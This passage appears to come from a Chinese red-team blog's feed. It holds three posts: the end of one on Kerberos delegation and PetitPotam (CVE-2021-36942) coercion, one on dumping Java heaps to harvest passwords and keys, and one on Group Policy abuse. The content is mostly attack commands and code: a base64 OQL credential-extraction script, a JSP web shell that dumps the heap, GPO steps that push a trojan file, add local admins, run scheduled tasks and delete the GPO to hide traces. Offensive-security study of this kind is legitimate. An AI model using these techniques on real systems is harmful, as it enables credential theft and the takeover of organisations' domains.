class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\<span class="selector-tag">psexec</span><span class="selector-class">.exe</span> <span class="selector-tag">-dc-ip</span> 10<span class="selector-class">.10</span><span class="selector-class">.10</span><span class="selector-class">.10</span> <span class="selector-tag">ad01-2016</span><span class="selector-class">.redteam</span><span class="selector-class">.com</span> <span class="selector-tag">-no-pass</span> <span class="selector-tag">-k</span> <span class="selector-tag">-codec</span> <span class="selector-tag">gbk</span></span><br></pre></td></tr></table></figure><h4 id="方法3：PetitPotam-MS-EFSRPC远程文件加密协议漏洞强制域请求"><a href="#方法3：PetitPotam-MS-EFSRPC远程文件加密协议漏洞强制域请求" class="headerlink" title="方法3：PetitPotam MS-EFSRPC远程文件加密协议漏洞强制域请求"></a>方法3：PetitPotam MS-EFSRPC远程文件加密协议漏洞强制域请求</h4><blockquote><p>利用EFSRPC（加密文件系统远程协议）进行中继攻击的漏洞（PetitPotam）,CVE-2021-36942</p></blockquote><p>利用条件：</p><ol><li>需要Administrator权限</li><li>需要Service系统或Service服务用户</li><li>2008-2012可匿名触发，2016及以上版本需要域内凭证<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Rubeus监听来自域控的票据,1秒一次</span></span><br><span class="line">Rubeus.exe<span class="built_in"> monitor </span>/interval:1 /filteruser:ad01-2016$</span><br></pre></td></tr></table></figure><img src="/11.png" alt="image.png"></li></ol><p><a href="https://github.com/topotam/PetitPotam.git" target="_blank" rel="noopener">https://github.com/topotam/PetitPotam.git</a></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">## Windows Server <span class="number">2008</span> <span class="number">2012</span>域内攻击方法</span><br><span class="line">PetitPotam.exe web<span class="number">-2012.</span>redteam.com <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Windows Server2016 或 域外攻击方法</span><br><span class="line">python3  PetitPotam.py -d redteam.com -u susan -p asd123= web<span class="number">-2012.</span>redteam.com <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span></span><br></pre></td></tr></table></figure><p><img src="/12.png" alt="image.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/seanzed/article/details/77619985" target="_blank" rel="noopener">AD用户属性userAccountControl的详细解释</a><br><a href="https://forum.butian.net/index.php/share/1591" target="_blank" rel="noopener">红队域渗透技术：委派攻击汇总（全）</a></p>]]></content>
      
      
      <categories>
          
          <category> 委派 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 导出内存查找敏感信息</title>
      <link href="/2023/01/04/Java-%E5%AF%BC%E5%87%BA%E5%86%85%E5%AD%98%E6%9F%A5%E6%89%BE%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/"/>
      <url>/2023/01/04/Java-%E5%AF%BC%E5%87%BA%E5%86%85%E5%AD%98%E6%9F%A5%E6%89%BE%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p>如果重要的数据（保存在内存中）在使用后没有及时清理，有可能会导致信息泄漏。开发人员通常都回用String 保存敏感数据（密码，卡号等）。因为String 对象是不可变的，只有 JVM 的垃圾回收器才能从内存中清除String的值。而只有内存不足的时候虚拟机才会执行垃圾回收，所以我们不能保证垃圾回收什么时候进行。当系统崩溃后，memory dump 可能会泄漏敏感数据。</p><a id="more"></a><h2 id="1、获取JVMHeapDump"><a href="#1、获取JVMHeapDump" class="headerlink" title="1、获取JVMHeapDump"></a>1、获取JVMHeapDump</h2><blockquote><p><strong>内存转储执行的过程中为了保证dump的信息是可靠的，所以会暂停应用</strong>， <strong>线上系统慎用</strong>。<br>JVM会将整个heap的信息dump写入到一个文件，heap如果比较大的话，就会导致这个过程比较耗时，如果要转储千兆字节大小的堆，则暂停时间以<strong>分钟</strong>而不是<strong>秒</strong>为单位。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#jmap，jcmd 都是JDK自带工具，指定JVM pid 直接dump</span></span><br><span class="line">jcmd <span class="number">5760</span>[PID] GC.heap_dump <span class="regexp">/tmp/</span>dumpHeap.hprof</span><br><span class="line">此转储过程比使用jmap进行转储要快得多！转储文件要小得多，但足以让您知道泄漏的位置。</span><br></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;jmap -<span class="keyword">dump</span>:live,format=b,<span class="keyword">file</span>=<span class="regexp">/tmp/</span>dumpHeap.hprof <span class="number">5760</span>  #live Object</span><br><span class="line"></span><br><span class="line">&gt;jmap -<span class="keyword">dump</span>:format=b,<span class="keyword">file</span>=<span class="regexp">/tmp/</span>dumpHeap.hprof <span class="number">19770</span>  # all Object 不建议</span><br><span class="line">如果使用<span class="string">"-dump"</span>，则将转储整个堆，包括不可达的对象。如果使用<span class="string">"-dump:live"</span>，则只会转储可访问的对象，但这（至少）需要标记堆以找出可访问的对象。</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/2118454/1672820322869-0e9aff63-b7e7-4f96-98be-3ae1f31a5010.png#averageHue=%232d2c2a&clientId=u8f4a23e9-4595-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=211&id=uea618b0d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=316&originWidth=958&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89994&status=done&style=none&taskId=ueebb3af7-f629-4c53-be13-0e6184c95c8&title=&width=638.6666666666666" alt="image.png"></p><h2 id="2、工具"><a href="#2、工具" class="headerlink" title="2、工具"></a>2、工具</h2><h3 id="JavaPassDump"><a href="#JavaPassDump" class="headerlink" title="JavaPassDump"></a>JavaPassDump</h3><p>工具：<a href="https://github.com/corener/JavaPassDump" target="_blank" rel="noopener">https://github.com/corener/JavaPassDump</a></p><blockquote><p>所有在Java层的数据库连接，最终都会维持一个DB Driver Object，其中会保留数据库的连接配置。<br>思路一：基于经验的，匹配所有DB Driver，从内存中找到Driver Object，获取username&#x2F;password字段 ；<br>思路二：绝大部分的配置信息，在内存中，都是String类型的field字段，直接从内存中提取password字段的field值。两种思路的前提都是能够分析内存，尝试直接分析运行时内存，从中提取配置信息，无奈坑点太多，遂转入dump JVMHeap，直接通过OQL语言进行分析。<br>实战中，DumpJVNHeap大小从几M～几G左右不等，拉到本地分析不太现实，直接在线上分析拿到分析结果就行。这样，在流量层面，效率方面，更优化。为了更简单通用，采用思路二，直接提取password字段的值。</p></blockquote><p>根据线上JDK环境，适配对应的jar，</p><ul><li>OQLQuery7-.jar 适配JDK&lt;&#x3D;7 </li><li>OQLQuery8+.jar 适配JDK&gt;&#x3D;8</li></ul><p>除了线上环境，OQLQuery.jar也可以用在本地分析JvmHeapDump.hprof文件，例如：Spring的&#x2F;heapdump接口，产生的dump文件，利用对应的OQL语句，也可以提取出密码参数 。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">## 放置于webServer的web路径下，访问时，dump当前JVM的heap到/tmp目录，windows系统，需要修改路径</span></span><br><span class="line"><span class="attr">&gt;heapDump.jsp </span></span><br><span class="line"><span class="attr"></span></span><br><span class="line"><span class="attr">## 分析JVMHeap文件 结尾为oql语句 base64</span>编码</span><br><span class="line">java -jar ./OQLQuery.jar /tmp/dumpHeap.hprof dmFyIGZpbHRlciA<span class="number">9</span>IHt<span class="number">9</span>OwptYXAoaGVhcC<span class="number">5</span>jbGFzc<span class="number">2</span>VzKCksIGZ<span class="number">1</span>bm<span class="symbol">N0</span>aW<span class="number">9</span>uIChjbHMpIHsKICAgcmV<span class="number">0</span>dXJuI<span class="name">G1</span>hcChjbHMuZmllbGRzLCBmdW<span class="number">5</span>jdGlvbiAoZmllbGQpIHsgCiAgICAgIGlmKCBmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lL<span class="symbol">nRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCkuY29</span>udGFpb<span class="symbol">nMoInBhc3</span>MiKSB<span class="number">8</span>fCBmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lL<span class="symbol">nRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCkuY29</span>udGFpb<span class="symbol">nMoInVzZXJuYW1</span>lIikgfHxmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lL<span class="symbol">nRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCkuY29</span>udGFpb<span class="symbol">nMoIlBBU1</span>MiKSl<span class="number">7</span>CiAgICAgICAgcmV<span class="number">0</span>dXJuI<span class="name">G1</span>hcChoZWFwL<span class="name">m9</span>iamVjdHMoY<span class="number">2</span>xzKSwgZ<span class="symbol">nVuY3</span>Rpb<span class="number">24</span>gK<span class="name">G9</span>icykgewogICAgICAgICAgdmFyIHRhZyA<span class="number">9</span>IG<span class="symbol">Nscy5</span>uYW<span class="number">1</span>lKyJ<span class="number">8</span>IitmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lIDsKICAgICAgICAgIHZhciByZXMgPSAgIm<span class="symbol">NsYXNzIDogIitjbHMubmFtZSsiXG4</span>gRmllbGQgWyAiK<span class="number">2</span>ZpZWxkL<span class="name">m5</span>hbWUud<span class="name">G9</span>TdHJpbmcoKSsiIDogIjsKICAgICAgICAgIGlmKCBvY<span class="symbol">nNbZmllbGQubmFtZS50</span>b<span class="number">1</span><span class="symbol">N0</span>cmluZygpXSAhPSBudWxsICl<span class="number">7</span>CiAgICAgICAgICAgIHJlcyA<span class="number">9</span>IHJlcyArI<span class="name">G9</span>ic<span class="number">1</span>tmaW<span class="attr">VsZC5</span>uYW<span class="number">1</span>lL<span class="symbol">nRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCldLnRvU3</span>RyaW<span class="number">5</span><span class="symbol">nKCkrIiBdXG4</span>iOwogICAgICAgICAgfW<span class="attr">Vsc2</span>V<span class="number">7</span>CiAgICAgICAgICAgIHJlcyA<span class="number">9</span>IHJlcyArICJudWxsIF<span class="number">1</span>cbiI<span class="number">7</span>CiAgICAgICAgICB<span class="number">9</span>CiAgICAgICAgICBpZiAoZmlsdGVyW<span class="number">3</span>RhZ<span class="number">10</span>gPT<span class="number">0</span>gb<span class="symbol">nVsbCkgewogICAgICAgICAgICBmaWx0</span>ZXJbdGF<span class="symbol">nXSA9</span>IHJlczsKICAgICAgICAgICAgcHJpb<span class="symbol">nQocmVzKTsKICAgICAgICAgIH0</span>KICAgICAgICAgIHJldHVybiBudWxsOwogICAgICAgIH<span class="number">0</span>pOwogICAgICB<span class="number">9</span>CiAgICAgIHJldHVybiBudWxsOwogIH<span class="number">0</span>pOwp<span class="number">9</span>KTs=</span><br></pre></td></tr></table></figure><p>oql语句</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var<span class="built_in"> filter</span> = &#123;&#125;;</span><br><span class="line"><span class="keyword">map</span>(heap.classes(), <span class="keyword">function</span> (cls) &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">map</span>(cls.fields, <span class="keyword">function</span> (field) &#123; </span><br><span class="line">      <span class="keyword">if</span>( field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"pass"</span>) || field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"username"</span>) ||field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"PASS"</span>)||field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"key"</span>)||field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"KEY"</span>)||field<span class="built_in">.name</span>.toString()<span class="built_in">.contains</span>(<span class="string">"key"</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">map</span>(heap.objects(cls), <span class="keyword">function</span> (obs) &#123;</span><br><span class="line">          var tag = cls<span class="built_in">.name</span>+<span class="string">"|"</span>+field<span class="built_in">.name</span> ;</span><br><span class="line">          var res =  <span class="string">"class : "</span>+cls<span class="built_in">.name</span>+<span class="string">"\n Field [ "</span>+field<span class="built_in">.name</span>.toString()+<span class="string">" : "</span>;</span><br><span class="line">          <span class="keyword">if</span>( obs[field<span class="built_in">.name</span>.toString()] != null )&#123;</span><br><span class="line">            res = res + obs[field<span class="built_in">.name</span>.toString()].toString()+<span class="string">" ]\n"</span>;</span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res = res + <span class="string">"null ]\n"</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> <span class="built_in">(filter</span>[tag] == null) &#123;</span><br><span class="line">           <span class="built_in"> filter</span>[tag] = res;</span><br><span class="line">            print(res);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> null;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> null;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dmFyIGZpbHRlciA9IHt9OwptYXAoaGVhcC5jbGFzc2VzKCksIGZ1bmN0aW9uIChjbHMpIHsKICAgcmV0dXJuIG1hcChjbHMuZmllbGRzLCBmdW5jdGlvbiAoZmllbGQpIHsgCiAgICAgIGlmKCBmaWVsZC5uYW1lLnRvU3RyaW5nKCkuY29udGFpbnMoInBhc3MiKSB8fCBmaWVsZC5uYW1lLnRvU3RyaW5nKCkuY29udGFpbnMoInVzZXJuYW1lIikgfHxmaWVsZC5uYW1lLnRvU3RyaW5nKCkuY29udGFpbnMoIlBBU1MiKXx8ZmllbGQubmFtZS50b1N0cmluZygpLmNvbnRhaW5zKCJrZXkiKXx8ZmllbGQubmFtZS50b1N0cmluZygpLmNvbnRhaW5zKCJLRVkiKXx8ZmllbGQubmFtZS50b1N0cmluZygpLmNvbnRhaW5zKCJrZXkiKSl7CiAgICAgICAgcmV0dXJuIG1hcChoZWFwLm9iamVjdHMoY2xzKSwgZnVuY3Rpb24gKG9icykgewogICAgICAgICAgdmFyIHRhZyA9IGNscy5uYW1lKyJ8IitmaWVsZC5uYW1lIDsKICAgICAgICAgIHZhciByZXMgPSAgImNsYXNzIDogIitjbHMubmFtZSsiXG4gRmllbGQgWyAiK2ZpZWxkLm5hbWUudG9TdHJpbmcoKSsiIDogIjsKICAgICAgICAgIGlmKCBvYnNbZmllbGQubmFtZS50b1N0cmluZygpXSAhPSBudWxsICl7CiAgICAgICAgICAgIHJlcyA9IHJlcyArIG9ic1tmaWVsZC5uYW1lLnRvU3RyaW5nKCldLnRvU3RyaW5nKCkrIiBdXG4iOwogICAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIHJlcyA9IHJlcyArICJudWxsIF1cbiI7CiAgICAgICAgICB9CiAgICAgICAgICBpZiAoZmlsdGVyW3RhZ10gPT0gbnVsbCkgewogICAgICAgICAgICBmaWx0ZXJbdGFnXSA9IHJlczsKICAgICAgICAgICAgcHJpbnQocmVzKTsKICAgICAgICAgIH0KICAgICAgICAgIHJldHVybiBudWxsOwogICAgICAgIH0pOwogICAgICB9CiAgICAgIHJldHVybiBudWxsOwogIH0pOwp9KTs=</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/2118454/1672728774252-a0b92579-19ca-47f0-b3ba-4824bc41fbc8.png#averageHue=%232e2f37&clientId=u53581134-91f7-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=333&id=u29a48a59&margin=%5Bobject%20Object%5D&name=image.png&originHeight=500&originWidth=903&originalType=binary&ratio=1&rotation=0&showTitle=false&size=283298&status=done&style=none&taskId=u9c90d513-8459-4b04-9dde-81b011b5551&title=&width=602" alt="image.png"></p><h3 id="heapdump-tool"><a href="#heapdump-tool" class="headerlink" title="heapdump_tool"></a>heapdump_tool</h3><blockquote><p>该工具是基于jhat，通过jhat解析heapdump文件，所以需要安装jdk和配置好环境变量，例如win \Java\jdk8\bin\jhat.exe，  在控制台输入jhat检查是否安装正确。</p></blockquote><p><a href="https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/20220720/heapdump_tool.jar" target="_blank" rel="noopener">https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/20220720/heapdump_tool.jar</a></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">usage:&gt; java -jar heapdump_tool.jar  heapdump</span><br><span class="line">查询方式：</span><br><span class="line"><span class="number">1.</span> 关键词    例如 password </span><br><span class="line"><span class="number">2.</span> 字符长度   len=<span class="number">10</span>    获取长度为<span class="number">10</span>的所有key或者value值</span><br><span class="line"><span class="number">3.</span> 按顺序获取  num=<span class="number">1</span><span class="number">-100</span> 获取顺序<span class="number">1</span><span class="number">-100</span>的字符</span><br><span class="line">获取url,file,ip</span><br><span class="line">geturl   获取所有字符串中的url</span><br><span class="line">getfile  获取所有字符串中的文件路径文件名</span><br><span class="line">getip    获取所有字符串中的ip</span><br><span class="line">默认不输出查询结果非key-value格式的数据，需要获取所有值，输入all=<span class="literal">true</span>，all=<span class="literal">false</span>取消显示所有值。</span><br></pre></td></tr></table></figure><h3 id="JDumpSpider"><a href="#JDumpSpider" class="headerlink" title="JDumpSpider"></a>JDumpSpider</h3><blockquote><p>本工具需要使用 Oracle JDK 1.8 版本（更高版本将导致异常）。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar .\target\JDumpSpider-<span class="number">1.0</span>-SNAPSHOT-full.jar                  </span><br><span class="line">Missing required parameter: <span class="string">'&lt;heapfile&gt;'</span></span><br><span class="line">Usage: JDumpSpider [-hV] &lt;heapfile&gt;                   </span><br><span class="line">Extract sensitive information from heapdump file.     </span><br><span class="line">      &lt;heapfile&gt;   Heap file path.                    </span><br><span class="line">  -h, --help       Show this help message and <span class="keyword">exit</span>.   </span><br><span class="line">  -V, --version    Print version information and <span class="keyword">exit</span>.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组策略定向攻击</title>
      <link href="/2022/12/11/%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/"/>
      <url>/2022/12/11/%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>大部份的公司的局域网都用到域服务来管理办公电脑，而域管理最主要的就是域策略配置，策略配置的好可以大大增加局域网的安全性。配置不当可称为攻击者后渗透的攻击手段。</p><a id="more"></a><h2 id="1、添加用户为本地管理员"><a href="#1、添加用户为本地管理员" class="headerlink" title="1、添加用户为本地管理员"></a>1、添加用户为本地管理员</h2><h3 id="1-1、添加域用户（可以用已有域用户）"><a href="#1-1、添加域用户（可以用已有域用户）" class="headerlink" title="1.1、添加域用户（可以用已有域用户）"></a>1.1、添加域用户（可以用已有域用户）</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670655796864-e28564e4-1da1-479e-8454-12ff52329e92.png#averageHue=%23eaeae6&clientId=ufa8cf655-9900-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=468&id=ua913c31d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=702&originWidth=1255&originalType=binary&ratio=1&rotation=0&showTitle=false&size=350454&status=done&style=none&taskId=u11c49e41-4747-49e7-b651-d2ab15c9c32&title=&width=836.6666666666666" alt="image.png"></p><h3 id="2-2、创建组策略"><a href="#2-2、创建组策略" class="headerlink" title="2.2、创建组策略"></a>2.2、创建组策略</h3><p> <strong>操作流程</strong>：服务器管理器 -&gt; 组策略管理  -&gt; 林：domain.com -&gt; 域 -&gt; domain.com -&gt; Default Domain Policy -&gt; 编辑 -&gt; 计算机配置 -&gt; 首选项 -&gt; 控制面板 -&gt; 本地用户和组 -&gt; 新建 -&gt; 本地组 -&gt; 添加域账户<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670250888859-54b039aa-69fe-44c8-a375-66152817ef6e.png#averageHue=%2366adcf&clientId=uedff4467-84d6-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=387&id=u6956d1bb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=581&originWidth=1096&originalType=binary&ratio=1&rotation=0&showTitle=false&size=153273&status=done&style=none&taskId=ufe5ed617-8553-4db6-b7be-a7e2b9820ac&title=&width=730.6666666666666" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670655823522-87a3eeb8-4472-4bf6-98fd-6bb37024d2a3.png#averageHue=%23bfd7dd&clientId=ufa8cf655-9900-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=573&id=ubb6c2ba7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=860&originWidth=1254&originalType=binary&ratio=1&rotation=0&showTitle=false&size=341915&status=done&style=none&taskId=ue9f5f460-ba2e-41a1-a358-53c9d564cc2&title=&width=836" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670250933822-33132226-9fd8-4b92-9895-3ba442a2fe80.png#averageHue=%23eff1ef&clientId=uedff4467-84d6-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=402&id=u9ebe3d40&margin=%5Bobject%20Object%5D&name=image.png&originHeight=603&originWidth=1077&originalType=binary&ratio=1&rotation=0&showTitle=false&size=184321&status=done&style=none&taskId=ua934c60d-c817-419f-a2e5-4a550ed5122&title=&width=718" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670655849958-cb33556b-7498-4673-bb2c-400617253bd8.png#averageHue=%23b0c1cf&clientId=ufa8cf655-9900-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=623&id=u99120b76&margin=%5Bobject%20Object%5D&name=image.png&originHeight=934&originWidth=1045&originalType=binary&ratio=1&rotation=0&showTitle=false&size=125711&status=done&style=none&taskId=uce50f65e-ae07-4409-bcde-f6a0ee8f6ab&title=&width=696.6666666666666" alt="image.png"><br>刷新组策略gpupdate &#x2F;force</p><h2 id="2、域内木马文件共享"><a href="#2、域内木马文件共享" class="headerlink" title="2、域内木马文件共享"></a>2、域内木马文件共享</h2><h3 id="2-1、域内共享文件夹"><a href="#2-1、域内共享文件夹" class="headerlink" title="2.1、域内共享文件夹"></a>2.1、域内共享文件夹</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NETLOGON目录</span><br><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ysvol<span class="symbol">\d</span>omain.com<span class="symbol">\S</span>CRIPTS</span><br><span class="line">SYSVOL目录</span><br><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>YSVOL<span class="symbol">\s</span>ysvol</span><br></pre></td></tr></table></figure><h4 id="2-1-1、NETLOGON目录"><a href="#2-1-1、NETLOGON目录" class="headerlink" title="2.1.1、NETLOGON目录"></a>2.1.1、NETLOGON目录</h4><p>挂载点:SYSVOL\domain\SCRIPTS 主要存放的是一些脚本信息，是AD活动目录安装时候自动创建的，是在sysvol下面的一个子目录文件夹。</p><h4 id="2-1-2、SYSVOL目录"><a href="#2-1-2、SYSVOL目录" class="headerlink" title="2.1.2、SYSVOL目录"></a>2.1.2、SYSVOL目录</h4><p>AD域中的一个共享文件夹，该文件夹在AD活动目录安装时候被创建。通常用来存放组策略数据 和 一些脚本配置文件，这些策略和脚本将用于传递给域成员机器。<br>此外，域控机器之间因为要自动同步域数据，SYSVOL文档允许该域内的所有DC机之间进行复制，并且所有的AD用户都可以访问它。域中，用户登录（计算机）时，会首先在SYSVOL文件查找GPO和启动脚本。同时，为了保证系统的正常运行，必须为SYSVOL保留足够的空间缓存，而且不能随意删除、改动该文件夹，要不然会出现一些组策略无法启用等报错信息。该目录由于针对的是域内所有机器和用户，所以域内中的合法用户均可以访问和执行该目录的文件。(普通的域用户也可以)<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670250051764-88fd6d69-72a6-4e81-98bf-ef39d93ebc31.png#averageHue=%230f0f0e&clientId=uedff4467-84d6-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u8a838f00&margin=%5Bobject%20Object%5D&name=image.png&originHeight=249&originWidth=817&originalType=url&ratio=1&rotation=0&showTitle=false&size=27720&status=done&style=none&taskId=ua118eea6-3420-40e0-8a3b-633b2c6fe02&title=" alt="image.png"></p><h3 id="2-2、操作方法"><a href="#2-2、操作方法" class="headerlink" title="2.2、操作方法"></a>2.2、操作方法</h3><h4 id="2-2-1、新建共享文件夹"><a href="#2-2-1、新建共享文件夹" class="headerlink" title="2.2.1、新建共享文件夹"></a>2.2.1、新建共享文件夹</h4><p> 设置共享权限，添加everyone和domain user共享权限。</p><h4 id="2-2-2、域控推送共享文件到客户端桌面"><a href="#2-2-2、域控推送共享文件到客户端桌面" class="headerlink" title="2.2.2、域控推送共享文件到客户端桌面"></a>2.2.2、域控推送共享文件到客户端桌面</h4><ul><li><p>开始 -&gt; 管理工具 -&gt; 组策略管理 -&gt; TJXY.COM(域名) -&gt; Default Domain Policy右键属性 -&gt; 编辑 -&gt; 用户配置 -&gt; 首选项 -&gt; Windows设置 -&gt; 文件</p></li><li><p>右键文件 -&gt; 新建 -&gt; 文件</p><p>   源文件是文件共享路径位置，目标文件是客户端桌面位置</p></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1670655902481-8d8a8587-4205-4708-88b1-82e9102e00f9.png#averageHue=%23d0caaa&clientId=ufa8cf655-9900-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=425&id=uf99038c1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=637&originWidth=1244&originalType=binary&ratio=1&rotation=0&showTitle=false&size=215918&status=done&style=none&taskId=u29777160-d629-4c36-916b-901c5323243&title=&width=829.3333333333334" alt="image.png"><br>      编辑完成后确定，注意：域控推送文件到客户端桌面，配置完成后服务器和主机先后更新组策略。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器默认更新组策略时间为<span class="number">5</span>分钟，客户端电脑默认更新组策略时间为<span class="number">90</span>分钟。</span><br><span class="line">## 立即更新组策略</span><br><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure><h2 id="3、域内计划任务创建"><a href="#3、域内计划任务创建" class="headerlink" title="3、域内计划任务创建"></a>3、域内计划任务创建</h2><h3 id="3-1、工具创建"><a href="#3-1、工具创建" class="headerlink" title="3.1、工具创建"></a>3.1、工具创建</h3><p><a href="https://github.com/3gstudent/Homework-of-Powershell" target="_blank" rel="noopener">New-GPOImmediateTask.ps1</a></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">## 导入ps1</span><br><span class="line">Import-Module GroupPolicy –verbose</span><br><span class="line"></span><br><span class="line">## 执行脚本添加计划任务</span><br><span class="line">New-GPOImmediateTask -TaskName Debugging -GPODisplayName TestGPO -SysPath <span class="string">'\\dc\sysvol\test1.local'</span> -CommandArguments <span class="string">'-c "123 | Out-File C:\test\debug.txt"'</span></span><br><span class="line"></span><br><span class="line">## 强制更新组策略，或者默认等待<span class="number">90</span>分组等待组策略强制更新</span><br><span class="line">Invoke-GPUpdate -Computer <span class="string">"TEST\COMPUTER-01"</span></span><br><span class="line"></span><br><span class="line">## 清理痕迹</span><br><span class="line">Remove-GPO -Name TestGPO</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
